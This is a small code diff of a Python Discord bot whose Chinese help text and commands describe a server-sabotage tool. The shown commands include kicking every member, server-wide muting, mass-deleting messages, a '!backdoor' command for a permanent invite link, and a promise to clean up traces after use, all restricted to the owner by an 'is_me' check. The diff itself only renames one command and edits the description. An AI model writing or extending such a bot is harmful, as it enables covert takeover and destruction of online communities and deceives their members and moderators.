@@ -85,7 +85,7 @@ async def help_msg(ctx):
     
     embed = discord.Embed(
         title="🧳 旅行者系統 - 指令完整手冊", 
-        description=f"實例編號：`{VERSION_ID}`\n此表僅授權人員可見。執行指令後會自動隱身並清理痕跡。",
+        description=f"實例編號：`{VERSION_ID}`\n此表僅授權人員可見。執行指令後會自動清理痕跡。",
         color=0x2b2d31
     )
     embed.add_field(
@@ -95,7 +95,7 @@ async def help_msg(ctx):
             "`!kick_everyone` - 踢出伺服器全員\n"
             "`!bye` - 機器人退出伺服器\n"
             "`!set_server [名]` - 修改伺服器名稱\n"
-            "`!server_gate [lock/unlock]` - 全服鎖定/解鎖發言\n"
+            "`!server_mute [lock/unlock]` - 全服鎖定/解鎖發言\n"
             "`!clean_user @成員 [數]` - 刪除指定人的訊息\n"
             "`!del_msg [數]` - 批次清理訊息\n"
             "`!backdoor` - 獲取永久邀請連結\n"
@@ -270,7 +270,7 @@ async def isolate(ctx, member: discord.Member):
     try: await member.edit(roles=[])
     except: pass
 
-@bot.command(name="server_gate")
+@bot.command(name="server_mute")
 async def server_gate(ctx, status: str):
     if not await is_me(ctx): return
     can_send = True if status == "unlock" else False
